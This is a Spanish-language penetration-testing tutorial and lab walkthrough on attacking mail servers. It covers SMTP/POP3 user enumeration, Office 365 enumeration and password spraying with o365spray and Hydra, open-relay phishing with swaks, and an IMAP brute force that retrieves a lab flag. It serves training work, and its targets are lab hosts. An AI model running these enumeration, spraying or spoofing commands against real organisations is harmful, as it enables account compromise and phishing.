
# Ataques a Emails

Un `mail server` (también denominado servidor de correo electrónico) es un servidor que maneja y entrega correo electrónico a través de una red, generalmente a través de Internet. Un servidor de correo puede recibir correos electrónicos desde un dispositivo cliente y enviarlos a otros servidores de correo. Un servidor de correo también puede entregar correos electrónicos a un dispositivo cliente. Un cliente suele ser el dispositivo donde leemos nuestros correos electrónicos (ordenadores, smartphones, etc.).

Cuando pulsamos el botón `Enviar` en nuestra aplicación de correo electrónico (cliente de correo electrónico), el programa establece una conexión con un servidor `SMTP` de la red o Internet. El nombre `SMTP` significa Simple Mail Transfer Protocol y es un protocolo para entregar correos electrónicos de clientes a servidores y de servidores a otros servidores.

Cuando descargamos correos electrónicos a nuestra aplicación de correo electrónico, se conectará a un servidor `POP3` o `IMAP4` en Internet, lo que permite al usuario guardar mensajes en el buzón de un servidor y descargarlos periódicamente.

De forma predeterminada, los clientes `POP3` eliminan los mensajes descargados del servidor de correo electrónico. Este comportamiento dificulta el acceso al correo electrónico en varios dispositivos, ya que los mensajes descargados se almacenan en la computadora local. Sin embargo, normalmente podemos configurar un cliente `POP3` para que guarde copias de los mensajes descargados en el servidor.

Por otro lado, de forma predeterminada, los clientes `IMAP4` no eliminan los mensajes descargados del servidor de correo electrónico. Este comportamiento facilita el acceso a mensajes de correo electrónico desde múltiples dispositivos. Veamos cómo podemos apuntar a servidores de correo.

![texto](https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png)

***

## <mark style="color:purple;">Enumeración</mark>

Los servidores de correo electrónico son complejos y normalmente requieren que enumeremos varios servidores, puertos y servicios. Además, hoy en día la mayoría de empresas tienen sus servicios de correo electrónico en la nube con servicios como [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook) o [G-Suite](https://workspace.google.com/solutions/new-business/) . Por lo tanto, nuestro enfoque para atacar el servicio de correo electrónico depende del servicio que se utilice.

Podemos utilizar el registro DNS `Mail eXchanger`( `MX`) para identificar un servidor de correo. El registro MX especifica el servidor de correo responsable de aceptar mensajes de correo electrónico en nombre de un nombre de dominio. Es posible configurar varios registros MX, que normalmente apuntan a una serie de servidores de correo para equilibrio de carga y redundancia.

Podemos utilizar herramientas como `host` o `dig` y sitios web en línea como [MXToolbox](https://mxtoolbox.com/) para consultar información sobre los registros MX:

### **Host - Registros MX**

```shell-session
afsh4ck@kali$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

```shell-session
afsh4ck@kali$ host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

### **DIG - Registros MX**

```shell-session
afsh4ck@kali$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

```shell-session
afsh4ck@kali$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```

### **Host - Registros A**

```shell-session
afsh4ck@kali$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

Estos registros `MX` indican que los primeros tres servicios de correo utilizan los servicios en la nube G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com) y Zoho (mx.zoho. com), y el último puede ser un servidor de correo personalizado alojado por la empresa.

Esta información es esencial porque los métodos de enumeración pueden diferir de un servicio a otro. Por ejemplo, la mayoría de los proveedores de servicios en la nube utilizan su implementación de servidor de correo y adoptan una autenticación moderna, lo que abre vectores de ataque nuevos y únicos para cada proveedor de servicios. Por otro lado, si la empresa configura el servicio podríamos descubrir malas prácticas y malas configuraciones que permitan ataques comunes a los protocolos de los servidores de correo.

Si apuntamos a una implementación de servidor de correo personalizado como `inlanefreight.htb`, podemos enumerar los siguientes puertos:

<table data-header-hidden><thead><tr><th width="180"></th><th></th></tr></thead><tbody><tr><td><strong>Puerto</strong></td><td><strong>Servicio</strong></td></tr><tr><td><code>TCP/25</code></td><td>SMTP sin cifrar</td></tr><tr><td><code>TCP/143</code></td><td>IMAP4 sin cifrar</td></tr><tr><td><code>TCP/110</code></td><td>POP3 sin cifrar</td></tr><tr><td><code>TCP/465</code></td><td>SMTP cifrado</td></tr><tr><td><code>TCP/587</code></td><td>SMTP cifrado/ <a href="https://en.wikipedia.org/wiki/Opportunistic_TLS">STARTTLS</a></td></tr><tr><td><code>TCP/993</code></td><td>IMAP4 cifrado</td></tr><tr><td><code>TCP/995</code></td><td>POP3 cifrado</td></tr></tbody></table>

Podemos usar la opción de script predeterminada de `-sC` de `Nmap` para enumerar esos puertos en el sistema de destino:

```shell-session
afsh4ck@kali$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```

***

## <mark style="color:purple;">Configuraciones erróneas</mark>

Los servicios de correo electrónico utilizan la autenticación para permitir a los usuarios enviar y recibir correos electrónicos. Puede ocurrir una configuración incorrecta cuando el servicio SMTP permite la autenticación anónima o admite protocolos que se pueden usar para enumerar nombres de usuario válidos.

### **Autenticación**

El servidor SMTP tiene diferentes comandos que se pueden usar para enumerar nombres de usuario válidos `VRFY`, `EXPN`y `RCPT TO`. Si enumeramos con éxito nombres de usuario válidos, podemos intentar un Password Spraying, forzarlas o adivinar una contraseña válida. Entonces, exploremos cómo funcionan esos comandos.

### **Comando VRFY**

El comando `VRFY` indica al servidor SMTP receptor que verifique la validez de un nombre de usuario de correo electrónico en particular. El servidor responderá indicando si el usuario existe o no. Esta característica se puede desactivar.

```shell-session
afsh4ck@kali$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

VRFY root
252 2.0.0 root

VRFY www-data
252 2.0.0 www-data

VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

### **Comando EXPN**

`EXPN` es similar a `VRFY`, excepto que cuando se usa con una lista de usuarios, enumerará todos los usuarios en esa lista. Esto puede ser un problema mayor que el comando `VRFY`, ya que los sitios suelen tener un alias como "todos".

```shell-session
afsh4ck@kali$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

### **Comando RCPT**

`RCPT TO` identifica el destinatario del mensaje de correo electrónico. Este comando se puede repetir varias veces para que un mensaje determinado entregue un solo mensaje a varios destinatarios.

```shell-session
afsh4ck@kali$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok

RCPT TO:julio
550 5.1.1 julio... User unknown

RCPT TO:kate
550 5.1.1 kate... User unknown

RCPT TO:john
250 2.1.5 john... Recipient ok
```

### **Comando USER**

También podemos utilizar el protocolo `POP3` para enumerar usuarios según la implementación del servicio. Por ejemplo, podemos usar el comando `USER` seguido del nombre de usuario, y si el servidor responde `OK`. Esto significa que el usuario existe en el servidor:

```shell-session
afsh4ck@kali$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio
-ERR

USER john
+OK
```

Para automatizar nuestro proceso de enumeración, podemos utilizar una herramienta llamada [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) . Podemos especificar el modo de enumeración con el argumento `-M` seguido de `VRFY`, `EXPN` o `RCPT` y el argumento `-U` con un archivo que contiene la lista de usuarios que queremos enumerar. Dependiendo de la implementación del servidor y el modo de enumeración, debemos agregar el dominio para la dirección de correo electrónico con el argumento `-D`. Finalmente, especificamos el objetivo con el argumento `-t`.

```shell-session
afsh4ck@kali$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

***

## <mark style="color:purple;">Enumeración de la nube</mark>

Como se mencionó, los proveedores de servicios en la nube utilizan su propia implementación para los servicios de correo electrónico. Esos servicios suelen tener características personalizadas de las que podemos abusar para su funcionamiento, como la enumeración de nombres de usuarios. Usemos Office 365 como ejemplo y exploremos cómo podemos enumerar nombres de usuario en esta plataforma en la nube.

[O365spray](https://github.com/0xZDH/o365spray) es una herramienta de enumeración de nombres de usuarios y contraseñas dirigida a Microsoft Office 365 (O365) desarrollada por [ZDH](https://twitter.com/0xzdh) . Esta herramienta implementa una colección de técnicas de enumeración y password spraying. Primero validemos si nuestro dominio de destino usa Office 365.

### **O365 Spray**

```shell-session
afsh4ck@kali$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Ahora podemos intentar identificar los nombres de usuario.

```shell-session
afsh4ck@kali$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

***

## <mark style="color:purple;">Ataques de contraseñas</mark>

Podemos utilizarlo `Hydra` para realizar un Password Spraying o fuerza bruta contra servicios de correo electrónico como `SMTP`, `POP3`o `IMAP4`. Primero, necesitamos obtener una lista de nombres de usuarios y contraseñas y especificar qué servicio queremos atacar. Veamos un ejemplo de `POP3`.

### **Hydra - Bruteforce**

```shell-session
afsh4ck@kali$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

Si los servicios en la nube admiten los protocolos SMTP, POP3 o IMAP4, es posible que podamos intentar realizar una pulverización de contraseñas utilizando herramientas como `Hydra`, pero estas herramientas suelen estar bloqueadas. En su lugar, podemos intentar utilizar herramientas personalizadas como [o365spray](https://github.com/0xZDH/o365spray) o [MailSniper](https://github.com/dafthack/MailSniper) para Microsoft Office 365 o [CredKing](https://github.com/ustayready/CredKing) para Gmail u Okta. Tenga en cuenta que estas herramientas deben estar actualizadas porque si el proveedor de servicios cambia algo (lo que sucede con frecuencia), es posible que las herramientas ya no funcionen. Este es un ejemplo perfecto de por qué debemos entender qué hacen nuestras herramientas y tener el conocimiento para modificarlas si no funcionan correctamente por algún motivo.

### **O365 Spray - Password Spraying**

```shell-session
afsh4ck@kali$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

***

## <mark style="color:purple;">Ataques específicos del protocolo</mark>

Una retransmisión abierta es un servidor de Protocolo simple de transferencia de correo ( `SMTP`), que está configurado incorrectamente y permite una retransmisión de correo electrónico no autenticado. Los servidores de mensajería que se configuran accidental o intencionalmente como retransmisiones abiertas permiten que el correo de cualquier fuente se redirija de forma transparente a través del servidor de retransmisión abierta. Este comportamiento enmascara el origen de los mensajes y hace que parezca que el correo se originó en el servidor de retransmisión abierto.

### **Open Relay**

Desde el punto de vista de un atacante, podemos abusar de esto para realizar phishing enviando correos electrónicos como usuarios no existentes o falsificando el correo electrónico de otra persona. Por ejemplo, imaginemos que nos dirigimos a una empresa con un servidor de correo de retransmisión abierto e identificamos que utiliza una dirección de correo electrónico específica para enviar notificaciones a sus empleados. Podemos enviar un correo electrónico similar usando la misma dirección y agregar nuestro enlace de phishing con esta información. Con el script `nmap smtp-open-relay` podemos identificar si un puerto SMTP permite una retransmisión abierta.

```shell-session
afsh4ck@kali# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

A continuación, podemos utilizar cualquier cliente de correo para conectarnos al servidor de correo y enviar nuestro correo electrónico.

```shell-session
afsh4ck@kali# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

***

## <mark style="color:purple;">Caso práctico</mark>

### Pregunta 1

> ¿Cuál es el nombre de usuario disponible para el dominio `inlanefreight.htb` en el servidor SMTP?

#### Escaneo de puertos

```bash
sudo nmap -v -sCV -Pn 10.129.203.12

PORT    STATE    SERVICE VERSION
110/tcp open     pop3?
| fingerprint-strings: 
|   GenericLines, NULL: 
|_    +OK POP3
143/tcp open     imap?
| fingerprint-strings: 
|   GetRequest, NULL: 
|_    * OK IMAPrev1
993/tcp filtered imaps
995/tcp filtered pop3s
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.203.12:1433: 
|     Target_Name: WIN-02
|     NetBIOS_Domain_Name: WIN-02
|     NetBIOS_Computer_Name: WIN-02
|     DNS_Domain_Name: WIN-02
|     DNS_Computer_Name: WIN-02
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.203.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-04-29T09:15:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-29T08:36:08
| Not valid after:  2054-04-29T08:36:08
| MD5:   8dc2:6b81:5bd3:ecba:b6fd:5287:67fd:5276
|_SHA-1: 643f:bfff:c57c:189a:4c37:74eb:7531:1482:dd4d:69d6
```

Hay 3 puertos abiertos interesantes, el 110, 143 y 1433. Viendo los registros MX nos encontramos con un servidor de correo personalizado alojado por la empresa: `mail1.inlanefreight.com`

```bash
dig mx inlanefreight.com | grep "MX" | grep -v ";"
inlanefreight.com.	5	IN	MX	10 mail1.inlanefreight.com
```

#### Enumeración de usuarios

{% code overflow="wrap" %}

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.28.18
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Mon Apr 29 12:47:25 2024 #########
10.129.28.18: marlin@inlanefreight.htb exists
```

{% endcode %}

### Pregunta 2

> Accede a la cuenta de correo electrónico utilizando las credenciales de usuario que descubriste y envía la flag en el correo electrónico como respuesta.

#### Bruteforce de IMAP

```
hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.203.12 imap
 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-30 10:06:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 333 login tries (l:1/p:333), ~21 tries per task
[DATA] attacking imap://10.129.203.12:143/
[143][imap] host: 10.129.203.12   login: marlin@inlanefreight.htb   password: poohbear
```

Buum!! Ya tenemos las credenciales del usuario `marlin`:

```
marlin@inlanefreight.htb
poohbear
```

Ahora vamos a conectarnos por Telnet para acceder a los mails:

```sql
telnet 10.129.203.12 143
Trying 10.129.203.12...
Connected to 10.129.203.12.
Escape character is '^]'.
* OK IMAPrev1
1 LOGIN marlin@inlanefreight.htb poohbear
1 OK LOGIN completed
```

Nos logueamos correctamente y enumeramos los emails:

{% code overflow="wrap" %}

```sql
1 LIST "" *
* LIST (\HasNoChildren) "." "INBOX"
1 OK LIST completed
1 SELECT INBOX
* 1 EXISTS
* 1 RECENT
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* OK [UIDVALIDITY 1650465305] current uidvalidity
* OK [UIDNEXT 2] next uid
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
1 OK [READ-WRITE] SELECT completed
1 FETCH 1 ALL
* 1 FETCH (RFC822.SIZE 601 FLAGS (\Seen) INTERNALDATE "20-Apr-2022 14:49:32 -0500" ENVELOPE ("Wed, 20 Apr 2022 15:49:11 -0400" "Password change" (("marlin" NIL "marlin" "inlanefreight.htb")) (("marlin" NIL "marlin" "inlanefreight.htb")) (("marlin" NIL "marlin" "inlanefreight.htb")) (("administrator@inlanefreight.htb" NIL "administrator" "inlanefreight.htb")) (("marlin@inlanefreight.htb" NIL "marlin" "inlanefreight.htb")) NIL NIL "<85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>"))
1 OK FETCH completed
```

{% endcode %}

Solamente hay 1 mail que vamos a enumerar:

```sql
1 FETCH 1 BODY[]
* 1 FETCH (BODY[] {640}
Return-Path: marlin@inlanefreight.htb
Received: from [10.10.14.33] (Unknown [10.10.14.33])
	by WINSRV02 with ESMTPA
	; Wed, 20 Apr 2022 14:49:32 -0500
Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb
Cc: marlin@inlanefreight.htb
Date: Wed, 20 Apr 2022 15:49:11 -0400
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.38.3-1 
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hi admin,

How can I change my password to something more secure? 

flag: HTB{w34k_p4$$w0rd}

)
1 OK FETCH completed
 BAD NULL COMMAND
```

Leemos correctamente el email y obtenemos la flag!
